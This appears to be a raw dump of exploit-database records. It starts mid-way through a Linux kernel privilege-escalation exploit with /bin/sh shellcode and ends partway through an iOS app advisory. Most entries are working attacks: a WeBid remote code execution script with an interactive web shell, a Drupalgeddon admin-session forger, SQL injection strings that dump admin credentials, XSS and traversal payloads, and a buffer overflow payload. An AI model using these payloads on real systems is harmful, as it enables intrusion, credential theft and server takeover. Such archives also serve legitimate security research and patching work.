*/ __asm__ (""	__excode:	call	1f			\n"" 	 ""	1:		mov	$23, %eax		\n"" 	 ""			xor	%ebx, %ebx		\n"" 	 ""			int	$0x80			\n"" 	 ""			pop	%eax			\n"" 	 ""			mov	$cmd-1b, %ebx		\n"" 	 ""			add	%eax, %ebx		\n"" 	 ""			mov	$arg-1b, %ecx		\n"" 	 ""			add	%eax, %ecx		\n"" 	 ""			mov	%ebx, (%ecx)		\n"" 	 ""			mov	%ecx, %edx		\n"" 	 ""			add	$4, %edx		\n"" 	 ""			mov	$11, %eax		\n"" 	 ""			int	$0x80			\n"" 	 ""			mov	$1, %eax		\n"" 	 ""			int	$0x80			\n"" 	 ""	arg:		.quad	0x00, 0x00		\n"" 	 ""	cmd:		.string		\""/bin/sh\""	\n"" 	 ""	__excode_e:	nop				\n"" 	 ""	.global		__excode			\n"" 	 ""	.global		__excode_e			\n"" 	);    extern void (*__excode) (void); extern void (*__excode_e) (void);   void error (char *err) {   perror (err);   fflush (stderr);   exit (1); }   /*	exploit this shit	*/ void exploit (char *file) {   int i, fd;   void *p;   struct stat st;    printf (""\ntrying to exploit %s\n\n"", file);   fflush (stdout);   chmod (""/proc/self/environ"", 04755);   c = mmap (0, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);   memset ((void *) c, 0, 4096);    /*      slow down machine       */   fd = open (file, O_RDONLY);   fstat (fd, &st);   p =     (void *) mmap (0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);   if (p == MAP_FAILED)     error (""mmap"");   prctl (PR_SET_DUMPABLE, 0, 0, 0, 0);   sprintf (t, ""/proc/%d/environ"", getpid ());   sched_yield ();   execve (NULL, a, e);   madvise (0, 0, MADV_WILLNEED);   i = fork ();    /*      give it a try           */   if (i)     {		           (*c)++;       !madvise (p, st.st_size, MADV_WILLNEED) ? : error (""madvise"");       prctl (PR_SET_DUMPABLE, 1, 0, 0, 0);       sched_yield ();	     }   else     { 	    nice(10); 	    while (!(*c)); 		sched_yield ();       execve (t, a, e);       error (""failed"");     }    waitpid (i, NULL, 0);   exit (0); }   int main (int ac, char **av) {   int i, j, k, s;   char *p;    memset (e, 0, sizeof (e));   memset (a, 0, sizeof (a));   a[0] = strdup (av[0]);   a[1] = strdup (av[0]);   a[2] = strdup (av[1]);    if (ac < 2)     error (""usage: binary <big file name>"");   if (ac > 2)     exploit (av[2]);   printf (""\npreparing"");   fflush (stdout);    /*      make setuid a.out       */   memset (&ex, 0, sizeof (ex));   N_SET_MAGIC (ex, NMAGIC);   N_SET_MACHTYPE (ex, M_386);   s = ((unsigned) &__excode_e) - (unsigned) &__excode;   ex.a_text = s;   ex.a_syms = -(s + sizeof (ex));    memset (b, 0, sizeof (b));   memcpy (b, &ex, sizeof (ex));   memcpy (b + sizeof (ex), &__excode, s);    /*      make environment        */   p = b;   s += sizeof (ex);   j = 0;   for (i = k = 0; i < s; i++)     {       if (!p[i]) 	{ 	  e[j++] = &p[k]; 	  k = i + 1; 	}     }    /*      reexec                  */   getcwd (t, sizeof (t));   strcat (t, ""/"");   strcat (t, av[0]);   execve (t, a, e);   error (""execve"");   return 0; }  // milw0rm.com [2006-07-15]",Linux Kernel,1
23836,"IBM Lotus Domino 6/7 - HTTP webadmin.nsf Directory Traversal source: https://www.securityfocus.com/bid/9900/info  It has been reported that Lotus Domino may be prone to a directory traversal vulnerability that may allow a remote attacker to access information outside the server root directory. The issue reportedly exists in the server's administrative interface accessed via 'webadmin.nsf'. The vulnerability may be exploited by a remote attacker by traversing outside the server root directory by using '../' directory traversal character sequences. Successful exploitation of this vulnerability may allow a remote attacker to gain access to sensitive information and/or modify the underlying file system.  IBM Lotus Domino server 6.5.1 has been reported to be prone to this issue, however, it is possible that other versions are affected as well.  1)Go to http://www.example.com/webadmin.nsf 2)Go to ""Files"" tab 3)From the ""Tools"" menu select to create a ""new"" folder 4)As the name of the new folder enter ""/../../../../../../pr00f""  or  ""/../../../../windows/win.ini""",IBM Lotus Domino,1
17487,"WeBid 1.0.2 - 'converter.php' Remote Code Execution <?php  /*  	------------------------------------------------------------ 	WeBid <= 1.0.2 (converter.php) Remote Code Execution Exploit 	------------------------------------------------------------ 	 	author...: EgiX 	mail.....: n0b0d13s[at]gmail[dot]com 	link.....: http://www.webidsupport.com/      	 	This PoC was written for educational purpose. Use it at your own risk. 	Author will be not responsible for any damage. 	 	 	[-] Vulnerable code to SQL injection in feedback.php: 	 	154.	$query = ""SELECT title FROM "" . $DBPrefix . ""auctions WHERE id = "" . $_REQUEST['auction_id'] . "" LIMIT 1""; 	155.	$res = mysql_query($query); 	156.	$system->check_mysql($res, $query, __LINE__, __FILE__); 	157.	$item_title = mysql_result($res, 0, 'title'); 	 	Input passed through $_REQUEST['auction_id'] isn't properly sanitised before being used in the SQL query at line 154.  	[-] Vulnerable code to SQL injection (works with magic_quotes_gpc = off) in logout.php:  	21.	if (isset($_COOKIE['WEBID_RM_ID'])) 	22.	{ 	23.	        $query = ""DELETE FROM "" . $DBPrefix . ""rememberme WHERE hashkey = '"" . $_COOKIE['WEBID_RM_ID'] . ""'""; 	24.	        $system->check_mysql(mysql_query($query), $query, __LINE__, __FILE__); 	25.	        setcookie('WEBID_RM_ID', '', time() - 3600); 	26.	}  	Input passed through $_COOKIE['WEBID_RM_ID'] isn't properly sanitised before being used in the SQL query at line 23.  	 	[-] Vulnerable code to SQL injection (works with magic_quotes_gpc = off) in user_login.php:  	84.			if (isset($_COOKIE['WEBID_ONLINE'])) 	85.			{ 	86.				$query = ""DELETE from "" . $DBPrefix . ""online WHERE SESSION = '"" . $_COOKIE['WEBID_ONLINE'] . ""'""; 	87.				$system->check_mysql(mysql_query($query), $query, __LINE__, __FILE__); 	88.			}  	Input passed through $_COOKIE['WEBID_ONLINE'] isn't properly sanitised before being used in the SQL query at line 86.  	[-] Vulnerable code to arbitrary PHP code jnjection (works with magic_quotes_gpc = off) in /includes/converter.inc.php:  	61.	function buildcache($newaarray) 	62.	{ 	63.	        global $include_path; 	64.	 	65.	        $output_filename = $include_path . 'currencies.php'; 	66.	        $output = ""<?php\n""; 	67.	        $output.= ""\$conversionarray[] = '"" . time() . ""';\n""; 	68.	        $output.= ""\$conversionarray[] = array(\n""; 	69.	 	70.	        for ($i = 0; $i < count($newaarray); $i++) 	71.	        { 	72.	                $output .= ""\t"" . ""array('from' => '"" . $newaarray[$i]['from'] . ""', 'to' => '"" . $newaarray[$i]['to'] . ""', 'rate' => '"" . $newaarray[$i]['rate'] . ""')""; 	73.	                if ($i < (count($newaarray) - 1)) 	74.	                { 	75.	                        $output .= "",\n""; 	76.	                } 	77.	                else 	78.	                { 	79.	                        $output .= ""\n""; 	80.	                } 	81.	        } 	82.	 	83.	        $output .= "");\n?>\n""; 	84.	 	85.	        $handle = fopen($output_filename, 'w'); 	86.	        fputs($handle, $output); 	87.	        fclose($handle); 	88.	}  	Input passed to buildcache() function through $_POST['from'] or $_POST['to'] isn't properly sanitised before being 	written to currencies.php file, this can lead to arbitrary PHP code injection.  	[-] Vulnerable code to LFI (works with magic_quotes_gpc = off) in /includes/converter.inc.php:  	18.	if (isset($_GET['lan']) && !empty($_GET['lan'])) 	19.	{ 	20.	        if ($user->logged_in) 	21.	        { 	22.	                $query = ""UPDATE "" . $DBPrefix . ""users SET language = '"" . mysql_real_escape_string($_GET['lan']) . ""' WHERE id = "" . $user->user_data['id']; 	23.	        } 	24.	        else 	25.	        { 	26.	                // Set language cookie 	27.	                setcookie('USERLANGUAGE', $_GET['lan'], time() + 31536000, '/'); 	28.	        } 	29.	        $language = $_GET['lan']; 	30.	} 	31.	elseif ($user->logged_in) 	32.	{ 	33.	        $language = $user->user_data['language']; 	34.	} 	35.	elseif (isset($_COOKIE['USERLANGUAGE'])) 	36.	{ 	37.	        $language = $_COOKIE['USERLANGUAGE']; 	38.	} 	39.	else 	40.	{ 	41.	        $language = $system->SETTINGS['defaultlanguage']; 	42.	} 	43.	 	44.	if (!isset($language) || empty($language)) $language = $system->SETTINGS['defaultlanguage']; 	45.	 	46.	include $main_path . 'language/' . $language . '/messages.inc.php';  	Input passed through $_GET['lan'] or $_COOKIE['USERLANGUAGE'] parameter isn't properly sanitised before  	being used to include files on line 46. This can be exploited to include arbitrary local files.  	[-] Information leak vulnerability into /logs directory, cause anyone can read cron.log and error.log   	[-] Disclosure timeline:  	[19/06/2011] - Vulnerabilities discovered 	[19/06/2011] - Vendor contacted 	[20/06/2011] - Vendor contacted again 	[21/06/2011] - No response from vendor 	[21/06/2011] - Issue reported to http://sourceforge.net/apps/mantisbt/simpleauction/view.php?id=34 	[22/06/2011] - Issue reported to http://www.webidsupport.com/forums/project.php?do=issuelist&projectid=1 	[22/06/2011] - Vendor responsed and released patches: http://www.webidsupport.com/forums/showthread.php?3892 	[04/07/2011] - Public disclosure  */  error_reporting(E_ERROR); set_time_limit(0);  if (!extension_loaded(""curl"")) die(""cURL extension required\n"");  $ch = curl_init(); curl_setopt($ch, CURLOPT_HEADER, 1); curl_setopt($ch, CURLOPT_VERBOSE, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  function http_post($page, $data) {	 	global $ch, $url; 	 	curl_setopt($ch, CURLOPT_URL, $url.$page); 	curl_setopt($ch, CURLOPT_POST, true); 	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);  	return curl_exec($ch); }  print ""\n+----------------------------------------------------------------------+""; print ""\n| WeBid <= 1.0.2 (converter.php) Remote Code Execution Exploit by EgiX |""; print ""\n+----------------------------------------------------------------------+\n"";  if ($argc < 2) { 	print ""\nUsage......: php $argv[0] <url>\n""; 	print ""\nExample....: php $argv[0] https://localhost/""; 	print ""\nExample....: php $argv[0] http://localhost/webid/\n""; 	die(); }  $url = $argv[1];  $code = rawurlencode(""\0'));print('_code_');passthru(base64_decode(\$_POST['c'])//""); http_post(""converter.php"", ""action=convert&from=USD&to={$code}"");  while(1) { 	print ""\nwebid-shell# ""; 	if (($cmd = trim(fgets(STDIN))) == ""exit"") break; 	preg_match(""/_code_(.*)/s"", http_post(""includes/currencies.php"", ""c="".base64_encode($cmd)), $m) ? print $m[1] : die(""\n[-] Exploit failed\n""); } ?>",WeBid,1
18114,"WordPress Plugin AdRotate 3.6.6 - SQL Injection # Exploit Title: WordPress AdRotate plugin <= 3.6.6 SQL Injection Vulnerability # Date: 2011-11-8 # Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm) # Software Link: http://downloads.wordpress.org/plugin/adrotate.3.6.6.zip # Version: 3.6.6 (tested) # Note: parameter $_GET[""track""] has to be Base64 encoded  --- PoC --- http://www.site.com/wp-content/plugins/adrotate/adrotate-out.php?track=MScgQU5EIDE9SUYoMj4xLEJFTkNITUFSSyg1MDAwMDAwLE1ENShDSEFSKDExNSwxMTMsMTA4LDEwOSw5NywxMTIpKSksMCkj  e.g. #!/bin/bash payload=""1' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)#"" encoded=`echo -n ""1' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)#"" | base64 -w 0` curl http://www.site.com/wp-content/plugins/adrotate/adrotate-out.php?track=$encoded  --------------- Vulnerable code ---------------  if(isset($_GET['track']) OR $_GET['track'] != '') {     $meta = base64_decode($_GET['track']);     ...     list($ad, $group, $block) = explode(""-"", $meta);     ...     $bannerurl = $wpdb->get_var($wpdb->prepare(""SELECT `link` FROM `"".$prefix.""adrotate` WHERE `id` = '"".$ad.""' LIMIT 1;"")); //wrong (mis)usage of wpdb->prepare()",WordPress Plugin AdRotate,1
5990,"Joomla! Component mygallery - 'cid' SQL Injection                H-T Team { HouSSamix & ToXiC350 } =====================================================================      Joomla Component mygallery Remote SQL Injection Exploit =====================================================================  ## AUTHOR :  HouSSamix From H-T TeaM  ## Script :  mygallery Joomla Component ( version unknown )  ## DorKs :  inurl:index.php?option=com_mygallery ""cid"" 			 ## EXPLOIT :  index.php?option=com_mygallery&func=viewcategory&cid=-1%20union%20select%201,2,user(),4,5,6,7,8,9,10,11,12--  ## Note : the number of columns can be diffrent .  ## GREETZ  :  CoNaN & Islam security Team & Mr l3frite & Mounita20 and all musulmans hackers  # milw0rm.com [2008-07-01]",Joomla! Component mygallery,1
6383,"EsFaq 2.0 - 'idcat' SQL Injection |___________________________________________________| | | EsFaq Remote Sql Injection Exploit | |___________________________________________________ |---------------------SuB-ZeRo----------------------| | |    Author: SuB-ZeRo | |    Home : www.dz-security.com | |    email:  FbH@hotmail.com | | |___________________________________________________ |                                                   | | | script :http://editeurscripts.com/ressources/scripts-php/dl.php?idscript=5 | | DorK   : inurl:questions.php?idcat |___________________________________________________| Exploit: ________   www.[target].com/Script/questions.php?idcat=10 UNION SELECT 1,concat(login,0x3a,password),3,4,5,6,7,8,9 FROM admin_users--      L!VE DEMO: _________ http://demo.editeurscripts.com/EsFaq/questions.php?idcat=10 UNION SELECT 1,concat(login,0x3a,password),3,4,5,6,7,8,9 FROM admin_users--  ____________   ____________________________( Greetz )_________________________________ | |    All members of the Forum  www.dz-security.com and www.no-exploit.com | | My friends : HiSoK4| x.CJP.x | bibi-infi | ThE BuTcHeR | charaf |  |  and all algeria hackers and all mouslimme |__________________________ramadan karim all mouslimme____________________________________________  # milw0rm.com [2008-09-05]",EsFaq,1
32801,"Barracuda Load Balancer - 'realm' Cross-Site Scripting source: https://www.securityfocus.com/bid/33779/info  Barracuda Load Balancer is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Barracuda Load Balancer 640 is vulnerable; other versions may also be affected.  http://www.example.com/cgi-mod/index.cgi?realm=""><script>alert(â??XSS Possible!!!â??)</script>",Barracuda Load Balancer,1
14112,"PageDirector CMS - 'result.php' SQL Injection      )   )            )                     (   (         (   (    (       )     )    ( /(( /( (       ( /(  (       (    (     )\ ))\ )      )\ ))\ ) )\ ) ( /(  ( /(    )\())\()))\ )    )\()) )\      )\   )\   (()/(()/(  (  (()/(()/((()/( )\()) )\())  ((_)((_)\(()/(   ((_)((((_)(  (((_)(((_)(  /(_))(_)) )\  /(_))(_))/(_))(_)\|((_)\  __ ((_)((_)/(_))___ ((_)\ _ )\ )\___)\ _ )\(_))(_))_ ((_)(_))(_)) (_))  _((_)_ ((_) \ \ / / _ (_)) __\ \ / (_)_\(_)(/ __(_)_\(_) _ \|   \| __| _ \ |  |_ _|| \| | |/ /   \ V / (_) || (_ |\ V / / _ \  | (__ / _ \ |   /| |) | _||   / |__ | | | .` | ' <     |_| \___/  \___| |_| /_/ \_\  \___/_/ \_\|_|_\|___/|___|_|_\____|___||_|\_|_|\_\ 										.WEB.ID -----------------------------------------------------------------------       PageDirector CMS (result.php) SQL Injection Vulnerability ----------------------------------------------------------------------- Author  	: v3n0m Site    	: http://yogyacarderlink.web.id/ Date		: June, 29-2010 Location	: Jakarta, Indonesia Time Zone	: GMT +7:00 ----------------------------------------------------------------  Affected software description: ~~~~~~~~~~~~~~~~~~~~~~~~~~  Application	: PageDirector CMS Vendor  	: http://www.customerparadigm.com/ Price		: $675.00 ----------------------------------------------------------------  Exploit: ~~~~~~~ +and+1=2+union+all+select+1,group_concat(username,char(58),password)v3n0m,3,4,5,6,7,8,9,10,11,12+from+admin--  Poc: ~~~~~~~  http://127.0.0.1/[path]/result.php?catid=[xxx]&sub_catid=[SQLi]  **[xxx] = valid catid ----------------------------------------------------------------  WWW.YOGYACARDERLINK.WEB.ID | v3n0m666[at]live[dot]com  ---------------------------[EOF]--------------------------------",PageDirector CMS,1
48457,WordPress Plugin ChopSlider 3.4 - 'id' SQL Injection # Exploit Title: ChopSlider3 Wordpress Plugin3.4 - 'id' SQL Injection # Exploit Author: SunCSR (Sun* Cyber Security Research) # Google Dork: N/A # Date: 2020-05 -12 # Vendor Homepage: https://idangero.us/ # Software Link: https://github.com/idangerous/Plugins # Version: <= 3.4 # Tested on: Ubuntu 18.04 # CVE: 2020-11530  Description: A blind SQL injection vulnerability is present in Chop Slider 3 '/wp-content/plugins/chopslider/get_script/index.php': $cs_result = $wpdb->get_row('SELECT * FROM ' . CHOPSLIDER_TABLE_NAME . ' WHERE chopslider_id =' . $id);  PoC: Blind SQL injection: GET /wp-content/plugins/chopslider/get_script/index.php?id=1111111 or (SELECT sleep(10))=6868 SQLMap using: sqlmap -u ' http://localhost/wp-content/plugins/chopslider/get_script/index.php?id=1111111111' --level=5 --risk=3 sqlmap identified the following injection point(s) with a total of 17611 HTTP(s) requests: --- Parameter: id (GET)     Type: boolean-based blind     Title: OR boolean-based blind - WHERE or HAVING clause     Payload: id=-3097 OR 2236=2236      Type: AND/OR time-based blind     Title: MySQL >= 5.0.12 OR time-based blind     Payload: id=1111111111 OR SLEEP(5) --- [08:55:01] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu web application technology: Apache 2.4.29 back-end DBMS: MySQL >= 5.0.12,WordPress Plugin ChopSlider,1
45467,"Easy PhoroResQ 1.0 - Buffer Overflow # Exploit Title: Easy PhoroResQ 1.0 - Buffer Overflow (PoC) # Discovery by: Cemal Cihad ÇİFTÇİ # Discovery Date: 2018-09-24 # Tested Version: 1.0 # Vulnerability Type: Local Buffer Overflow # Tested on OS: Windows XP Professional Service Pack 3 # Vendor Homepage: http://www.easyphotoresq.com/ # Download Link: http://www.easyphotoresq.com/download.html # Steps to Reproduce: Run the python exploit script, it will create a new  # file with the name ""boom.txt"". Copy the content of the new file ""boom.txt"".  # Now start the program. Now when you are inside of the programwindow #click ""File"" > ""Options"".  # In the field: ""Folder/filename"" paste the copied #content from ""boom.txt"".  # Now click ""OK"" and calc.exe will appear.  #!/usr/bin/python  buffer = ""A"" * 1320 + ""\xdf\x44\xc6\x4e"" + ""\x31\xC9\x51\x68\x63\x61\x6C\x63\x54\xB8\xC7\x93\xC2\x77\xFF\xD0""  payload = buffer try:     f=open(""boom.txt"",""w"")     print ""[+] Creating %s bytes evil payload.."" %len(payload)     f.write(payload)     f.close()     print ""[+] File created!"" except:     print ""File cannot be created""",Easy PhoroResQ,1
44355,"Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session) <?php //    _____      __   __  _             _______ //   / ___/___  / /__/ /_(_)___  ____  / ____(_)___  _____ //   \__ \/ _ \/ //_/ __/ / __ \/ __ \/ __/ / / __ \/ ___/ //  ___/ /  __/ ,< / /_/ / /_/ / / / / /___/ / / / (__  ) // /____/\___/_/|_|\__/_/\____/_/ /_/_____/_/_/ /_/____/ // Poc for Drupal Pre Auth SQL Injection - (c) 2014 SektionEins // // created by Stefan Horst <stefan.horst@sektioneins.de> //·  include 'common.inc'; include 'password.inc';  // set values $user_name = 'admin';  $url = isset($argv[1])?$argv[1]:''; $user_id = isset($argv[2])?intval($argv[2]):1;  if ($url == '-h') {       echo ""usage:\n"";       echo $argv[0].' $url [$user_id]'.""\n"";       die(); }  if (empty($url) || strpos($url,'https') === False) {       echo ""please state the cookie url. It works only with https urls.\n"";       die(); }  if (strpos($url, 'www.') === 0) {       $url = substr($url, 4); }  $url = rtrim($url,'/');  list( , $session_name) = explode('://', $url, 2);  // use insecure cookie with sql inj. $cookieName = 'SESS' . substr(hash('sha256', $session_name), 0, 32); $password = user_hash_password('test');  $session_id = drupal_random_key(); $sec_ssid = drupal_random_key();  $inject = ""UNION SELECT $user_id,'$user_name','$password','','','',null,0,0,0,1,null,'',0,'',null,$user_id,'$session_id','','127.0.0.1',0,0,null -- "";  $cookie = $cookieName.'[test+'.urlencode($inject).']='.$session_id.'; '.$cookieName.'[test]='.$session_id.'; S'.$cookieName.'='.$sec_ssid;  // send the request to the server $ch = curl_init($url);  curl_setopt($ch,CURLOPT_HEADER,True); curl_setopt($ch,CURLOPT_RETURNTRANSFER,True); curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,False); curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0');  curl_setopt($ch,CURLOPT_HTTPHEADER,array(       'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',       'Accept-Language: en-US,en;q=0.5' ));  curl_setopt($ch,CURLOPT_COOKIE,$cookie);  $output = curl_exec($ch);  curl_close($ch);  echo ""Session with this ID created:\n""; echo ""S"".$cookieName."": "".$sec_ssid;",Drupal,1
23201,"VideoLAN VLC Media Player 2.0.4 - '.swf' Crash (PoC) Title    :  VLC media player 2.0.4 buffer overflow POC Version  :  2.0.4 Twoflower Date     :  2012-12-06 Vendor   :  www.videolan.org/vlc/ Impact   :  Med/High Contact  :  coolkaveh [at] rocketmail.com Twitter  :  @coolkaveh tested   :  windows XP SP3 Author   :  coolkaveh ##################################################################################################################### VLC media player (also known as VLC) is a highly portable free and open-source media player and streaming  media server written by the VideoLAN project. It is a cross-platform media player, with versions for  Microsoft Windows, OS X, GNU/Linux, Android, BSD, Solaris, iOS, Syllable, BeOS, MorphOS, QNX and eComStation ##################################################################################################################### Bug : ---- buffer overflow during the handling of the swf file context-dependent Successful exploits can allow attackers to execute arbitrary code ---- ###################################################################################################################### (7b4.a14): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=75737574 ebx=00e44c20 ecx=7ffd5000 edx=00e44e84 esi=038488c8 edi=000007c0 eip=75737574 esp=0196fb5c ebp=00000002 iopl=0         nv up ei pl nz na pe nc cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206 Missing image name, possible paged-out or corrupt data. 75737574 ??              ??? 0:009>!exploitable -v eax=75737574 ebx=00e44c20 ecx=7ffd5000 edx=00e44e84 esi=038488c8 edi=000007c0 eip=75737574 esp=0196fb5c ebp=00000002 iopl=0         nv up ei pl nz na pe nc cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206 75737574 ??              ??? HostMachine\HostUser Executing Processor Architecture is x86 Debuggee is in User Mode Debuggee is a live user mode debugging session on the local machine Event Type: Exception *** ERROR: Symbol file could not be found.  Defaulted to export symbols for ntdll.dll -  *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\VideoLAN\VLC\libvlccore.dll -  *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\VideoLAN\VLC\plugins\codec\libavcodec_plugin.dll -  Exception Faulting Address: 0x75737574 First Chance Exception Type: STATUS_ACCESS_VIOLATION (0xC0000005) Exception Sub-Type: Data Execution Protection (DEP) Violation  Exception Hash (Major/Minor): 0x307d391a.0x6f0f1537  Stack Trace: Unknown libvlccore!vout_ReleasePicture+0x32 libavcodec_plugin!vlc_entry_license__1_2_0l+0xe09 libavcodec_plugin!vlc_entry_license__1_2_0l+0xdf26b libavcodec_plugin!vlc_entry_license__1_2_0l+0xdee0e libavcodec_plugin!vlc_entry_license__1_2_0l+0xdf37b ntdll!RtlFreeHeap+0x18b Instruction Address: 0x0000000075737574  Description: Data Execution Prevention Violation Short Description: DEPViolation Exploitability Classification: EXPLOITABLE Recommended Bug Title: Exploitable - Data Execution Prevention Violation starting at Unknown Symbol @ 0x0000000075737574 called from libvlccore!vout_ReleasePicture+0x0000000000000032 (Hash=0x307d391a.0x6f0f1537)  User mode DEP access violations are exploitable. ################################################################################ Proof of concept included.  http://www39.zippyshare.com/v/91522221/file.html Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/23201.rar",VideoLAN VLC Media Player,1
29567,"Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting source: https://www.securityfocus.com/bid/22401/info  Adobe ColdFusion is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker could exploit this vulnerability to execute arbitrary script code in the context of the affected website. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://www.example.com/&USER_AGENT=%3Cscript%3Ealert(String.fromCharCode(120,115,115))%3C/s> cript%3E&HTTP_REFERER=http://www.google.com/",Adobe ColdFusion,1
27656,"Photo Transfer Upload 1.0 iOS - Multiple Vulnerabilities Title: ====== Photo Transfer Upload v1.0 iOS - Multiple Vulnerabilities   Date: ===== 2013-08-16   References: =========== http://www.vulnerability-lab.com/get_content.php?id=1047   VL-ID: ===== 1047   Common Vulnerability Scoring System: ==================================== 8.6   Introduction: ============= Photo Transfer Access and transfer all your photos between your iPhone/iPad and PC/Mac without 3rd party transfer utilities. It can easily access your photo libraries via wifi from any computer with a web browser(IE/Chrome/Safari) on the same wifi  network, very easy to use!  - Support drag & drop upload, easy to use - Transfer multiple photos and videos at once - Download photos and videos as zip archives - Crate new album - Password protection for the web access  ( Copy of the Homepage: https://itunes.apple.com/us/app/photo-transfer-upload-download/id672205608 )   Abstract: ========= The Vulnerability Laboratory Research Team discovered a persistent vulnerability in the Photo Transfer Upload v1.0 application (Apple iOS - iPad & iPhone).   Report-Timeline: ================ 2013-08-16:    Public Disclosure (Vulnerability Laboratory)   Status: ======== Published   Affected Products: ================== Apple AppStore Product: Photo Transfer Upload - Mobile Application 1.0   Exploitation-Technique: ======================= Remote   Severity: ========= Critical   Details: ======== 1.1 A local file/path include web vulnerability is detected in the Photo Transfer Upload v1.0 application (Apple iOS - iPad & iPhone). The file include vulnerability allows remote attackers to include (upload) local file or path requests to compromise the application or service.  The vulnerability is located in the upload module when processing to upload files with manipulated filename values in the POST method request.  The attacker can inject local path or files to request context and compromise the mobile device or web service. The validation has a bad side  effect which impacts the risk to combine the attack with persistent injected script code.  Exploitation of the local file include web vulnerability requires no user interaction or privilege application user account with password.  Successful exploitation of the vulnerability results in unauthorized local file and path requests to compromise the device or application.  Vulnerable Application(s): 				[+] Photo Transfer Upload v1.0 - ITunes or AppStore (Apple)  Vulnerable Module(s): 				[+] Upload (Files) - (http://localhost)  Vulnerable Parameter(s): 				[+] filename   Affected Module(s): 				[+] Index File Dir Listing    1.2 An arbitrary file upload web vulnerability is detected in the Photo Transfer Upload v1.0 application (Apple iOS - iPad & iPhone). The arbitrary file upload issue allows a remote attacker to upload files with multiple extensions to bypass the validation for unauthorized access.  The vulnerability is located in the upload module when processing to upload files with multiple ending extensions. Attackers are able to upload  a php or js web-shells by renaming the file with multiple extensions. The attacker uploads for example a web-shell with the following name and  extension image.jpg.js.php.jpg . The attacker needs to open the file in the web application and deletes the .jpg file extension to access the  picture with elevated access rights.  Exploitation of the arbitrary file upload web vulnerability requires no user interaction or privilege application user account with password. Successful exploitation of the vulnerability results in unauthorized file access because of a compromise after the upload of web-shells.  Vulnerable Application(s): 				[+] Photo Transfer Upload v1.0 - ITunes or AppStore (Apple)  Vulnerable Module(s): 				[+] Upload (Files) - (http://localhost)  Vulnerable Parameter(s): 				[+] filename (multiple extensions)  Affected Module(s): 				[+] Index File Dir Listing   1.3 A persistent input validation web vulnerability is detected in the Photo Transfer Upload v1.0 application (Apple iOS - iPad & iPhone). The bug allows an attacker (remote) to implement/inject malicious own malicious persistent script codes (application side).  The vulnerability is located in the `Add Photo Album` module of the web-server interface (http://localhost) when processing to  request via POST method manipulated `album names`. The album name will be changed to the path value without secure filter,  encode or parse mechanism. The injected script code will be executed in the main index file dir folder listing of the mobile application.  Exploitation of the persistent web vulnerability requires low user interaction and no privilege application user account with a password.  Successful exploitation of the vulnerability can lead to persistent session hijacking (customers), account steal via persistent web attacks,  persistent phishing or persistent module context manipulation.  Vulnerable Application(s): 				[+] Photo Transfer Upload v1.0 - ITunes or AppStore (Apple)  Vulnerable Module(s): 				[+] Add Photo Album  Vulnerable Parameter(s): 				[+] Album Name  Affected Module(s): 				[+] Index Listing 				[+] Sub Category Listing   Proof of Concept: ================= 1.1 The file/path include web vulnerability can be exploited by remote attackers without user interaction or  privilege application user account. For demonstration or reproduce ...   --- POST --- (Upload #1) POSTDATA =-----------------------------144252594127308 Content-Disposition: form-data; name=""params""  name:Camera%20Roll|url:95016B21-FEE4-43E5-802D-3891B9C6ACF4 -----------------------------144252594127308 Content-Disposition: form-data; name=""newfile""; filename=""><;../../var/mobile/x[FILE INCLUDE VULNERABILITY]"" Content-Type: image/png ‰PNG - --- POST --- (LIST INDEX #1 #2) POSTDATA={""url"":""ALL""}   Note: After the file/path include the attacker can open the index module or sub category to execute the request.    1.2 The arbitrary file upload web vulnerability can be exploited by remote attackers without user interaction or  privilege application user account. For demonstration or reproduce ...   --- POST --- (Upload #2) POSTDATA =-----------------------------144252594127308 Content-Disposition: form-data; name=""params""  name:Camera%20Roll|url:95016B21-FEE4-43E5-802D-3891B9C6ACF4 -----------------------------144252594127308 Content-Disposition: form-data; name=""newfile""; filename=""pentester.jpg.html.js.php.asp.xml.jpg"" Content-Type: image/png ‰PNG  --- POST --- (LIST INDEX #1 #2) POSTDATA={""url"":""ALL""}  Note: After the file upload the attacker deletes the .jpg extension to access the injected webshell.    1.3 The persistent input validation web vulnerability can be exploited by remote attackers without privilege application user  account and also without user interaction. For demonstration or reproduce ...   PoC:  Index - Album Name  <ul class=""thumbnails"" id=""albums""><li class=""album_warp""><a href=""http://localhost/album.html?name=Camera%20Roll& url=assets-library://group/?id=D579B80C-B73D-4A16-9379-FB29A6CFC12C"" class=""thumbnail""> <img src=""Photo%20Transfer_files/-1886868417.PNG"" class=""album_image""><h5 class=""album_title"">Camera Roll</h5> <p class=""album_desc"">11 Photos</p></a></li><li class=""album_warp""> <a href=""http://localhost/album.html?name=%3E%22%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Cdiv%20style=%222& 